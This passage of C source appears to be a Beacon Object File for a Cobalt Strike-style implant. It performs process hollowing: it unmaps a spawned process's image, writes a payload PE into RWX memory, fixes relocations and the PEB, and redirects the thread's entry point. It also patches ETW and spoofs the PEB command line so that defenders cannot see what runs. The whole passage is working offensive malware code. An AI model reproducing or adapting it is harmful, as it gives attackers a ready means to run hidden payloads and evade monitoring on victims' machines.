            KERNEL32$WriteProcessMemory(sctx.pi.hProcess, (PVOID)(pebAddr + 0x10),
                &newBase, sizeof(newBase), &bw3);

            KERNEL32$FlushInstructionCache(sctx.pi.hProcess, pRemote, pi2.sizeOfImage);

            ctx.Rcx = (DWORD64)((ULONG_PTR)pRemote + pi2.entryPointRva);
            KERNEL32$SetThreadContext(sctx.pi.hThread, &ctx);

        } else {
            /* ---- x86 PE HOLLOWING (WoW64) ---- */

            /* Get PEB32 address via ProcessWow64Information */
            ULONG_PTR peb32Addr = 0;
            NTDLL$NtQueryInformationProcess(sctx.pi.hProcess, ProcessWow64Information,
                &peb32Addr, sizeof(peb32Addr), NULL);
            if (peb32Addr == 0) {
                BeaconPrintf(CALLBACK_ERROR, "Not a WoW64 process — spawnto must be 32-bit for x86 PE");
                KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup;
            }

            /* Read original 32-bit ImageBase from PEB32 + 0x08 */
            DWORD origBase32 = 0;
            SIZE_T br = 0;
            KERNEL32$ReadProcessMemory(sctx.pi.hProcess, (PVOID)(peb32Addr + 0x08),
                &origBase32, sizeof(origBase32), &br);

            /* Unmap original 32-bit image */
            NTDLL$NtUnmapViewOfSection(sctx.pi.hProcess, (PVOID)(ULONG_PTR)origBase32);

            /* Allocate at origBase32 (32-bit address space, < 4GB) */
            BYTE *pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
                (PVOID)(ULONG_PTR)origBase32, pi2.sizeOfImage,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!pRemote)
                pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
                    (PVOID)pi2.imageBase, pi2.sizeOfImage,
                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!pRemote)
                pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess, NULL,
                    pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!pRemote) {
                BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
                KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup;
            }

            WritePEToChild(sctx.pi.hProcess, pRemote, payload, payloadSize, hdr, &pi2);

            /* Relocate */
            ULONG_PTR delta = (ULONG_PTR)pRemote - pi2.imageBase;
            if (delta != 0) {
                int rc = ApplyRelocationsRemote(sctx.pi.hProcess, pRemote, &pi2, delta);
                if (rc < 0) { KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup; }

                PIMAGE_DOS_HEADER pD = (PIMAGE_DOS_HEADER)hdr;
                DWORD newImgBase32 = (DWORD)(ULONG_PTR)pRemote;
                SIZE_T bw2 = 0;
                KERNEL32$WriteProcessMemory(sctx.pi.hProcess,
                    pRemote + pD->e_lfanew + offsetof(IMAGE_NT_HEADERS32, OptionalHeader) +
                    offsetof(IMAGE_OPTIONAL_HEADER32, ImageBase),
                    &newImgBase32, sizeof(newImgBase32), &bw2);
            }

            /* Update PEB32 ImageBase */
            DWORD newBase32 = (DWORD)(ULONG_PTR)pRemote;
            SIZE_T bw3 = 0;
            KERNEL32$WriteProcessMemory(sctx.pi.hProcess, (PVOID)(peb32Addr + 0x08),
                &newBase32, sizeof(newBase32), &bw3);

            KERNEL32$FlushInstructionCache(sctx.pi.hProcess, pRemote, pi2.sizeOfImage);

            /* Set WOW64 context: Eax = entry point */
            BYTE wow64ctx[WOW64_CTX_SIZE];
            xmemset(wow64ctx, 0, sizeof(wow64ctx));
            *(DWORD*)(wow64ctx + WOW64_CTX_OFF_FLAGS) = WOW64_CTX_ALL;
            if (!KERNEL32$Wow64GetThreadContext(sctx.pi.hThread, wow64ctx)) {
                BeaconPrintf(CALLBACK_ERROR, "Wow64GetThreadContext: %lu", KERNEL32$GetLastError());
                KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup;
            }

            DWORD entry32 = (DWORD)((ULONG_PTR)pRemote + pi2.entryPointRva);
            *(DWORD*)(wow64ctx + WOW64_CTX_OFF_EAX) = entry32;

            if (!KERNEL32$Wow64SetThreadContext(sctx.pi.hThread, wow64ctx)) {
                BeaconPrintf(CALLBACK_ERROR, "Wow64SetThreadContext: %lu", KERNEL32$GetLastError());
                KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup;
            }

        }

        /* ETW + command line spoof (both architectures) */
        PatchETW(sctx.pi.hProcess);

        {
            const char *bn = spawntoA;
            const char *s = spawntoA;
            while (*s) { if (*s == '\\' || *s == '/') bn = s + 1; s++; }
            char realCmd[4096];
            xmemset(realCmd, 0, sizeof(realCmd));
            if (args && args[0])
                MSVCRT$_snprintf(realCmd, sizeof(realCmd) - 1, "%s %s", bn, args);
            else
                MSVCRT$_snprintf(realCmd, sizeof(realCmd) - 1, "%s", bn);

            if (pi2.is64) {
                /* x64: spoof 64-bit PEB CommandLine */
                SpoofCommandLine(sctx.pi.hProcess, realCmd);
            } else {
                /* x86: spoof 32-bit PEB CommandLine.
                   32-bit PE reads from PEB32→ProcessParameters→CommandLine.
                   PEB32+0x10 = ProcessParameters (DWORD ptr)
                   ProcessParameters+0x40 = CommandLine.Length (USHORT)
                   ProcessParameters+0x44 = CommandLine.Buffer (DWORD ptr) */
                ULONG_PTR peb32 = 0;
                NTDLL$NtQueryInformationProcess(sctx.pi.hProcess, ProcessWow64Information,
                    &peb32, sizeof(peb32), NULL);
                if (peb32) {
                    DWORD procParams32 = 0;
                    SIZE_T br2 = 0;
                    KERNEL32$ReadProcessMemory(sctx.pi.hProcess, (PVOID)(peb32 + 0x10),
                        &procParams32, sizeof(procParams32), &br2);
                    if (procParams32) {
                        DWORD cmdBuf32 = 0;
                        KERNEL32$ReadProcessMemory(sctx.pi.hProcess,
                            (PVOID)(ULONG_PTR)(procParams32 + 0x44),
                            &cmdBuf32, sizeof(cmdBuf32), &br2);
                        if (cmdBuf32) {
                            int wLen = KERNEL32$MultiByteToWideChar(0, 0, realCmd, -1, NULL, 0);
                            if (wLen > 0) {
                                LPWSTR wBuf = (LPWSTR)KERNEL32$LocalAlloc(0x40, wLen * sizeof(WCHAR));
                                if (wBuf) {
                                    KERNEL32$MultiByteToWideChar(0, 0, realCmd, -1, wBuf, wLen);
                                    SIZE_T bw = 0;
                                    KERNEL32$WriteProcessMemory(sctx.pi.hProcess,
                                        (PVOID)(ULONG_PTR)cmdBuf32, wBuf,
                                        wLen * sizeof(WCHAR), &bw);
                                    USHORT newLen = (USHORT)((wLen - 1) * sizeof(WCHAR));
                                    KERNEL32$WriteProcessMemory(sctx.pi.hProcess,
                                        (PVOID)(ULONG_PTR)(procParams32 + 0x40),
                                        &newLen, sizeof(USHORT), &bw);
                                    KERNEL32$LocalFree(wBuf);
                                }
                            }
                        }
                    }
                }
                /* Also spoof 64-bit PEB for tools that check both */
                SpoofCommandLine(sctx.pi.hProcess, realCmd);
            }
        }

        KERNEL32$LocalFree(hdr);
        ok = TRUE;
    }

    if (!ok) { SpawnCleanup(&sctx, FALSE); goto cleanup; }

    /* ---- Resume ---- */
    KERNEL32$ResumeThread(sctx.pi.hThread);
    if (sctx.hPipeInWrite) { KERNEL32$CloseHandle(sctx.hPipeInWrite); sctx.hPipeInWrite = NULL; }

    if (wantOutput && sctx.hPipeOutRead)
        CollectOutput(sctx.pi.hProcess, sctx.hPipeOutRead, (DWORD)timeoutMs);
    else if (!wantOutput)
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Fire and forget");

    if (sctx.hPipeOutRead) KERNEL32$CloseHandle(sctx.hPipeOutRead);
    if (sctx.hPipeInWrite) KERNEL32$CloseHandle(sctx.hPipeInWrite);
    if (sctx.pi.hProcess)  KERNEL32$CloseHandle(sctx.pi.hProcess);
    if (sctx.pi.hThread)   KERNEL32$CloseHandle(sctx.pi.hThread);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");

cleanup:
    xmemset(hdrBuf, 0, sizeof(hdrBuf));
    if (freePayload && payloadAllocBase) KERNEL32$LocalFree(payloadAllocBase);
}
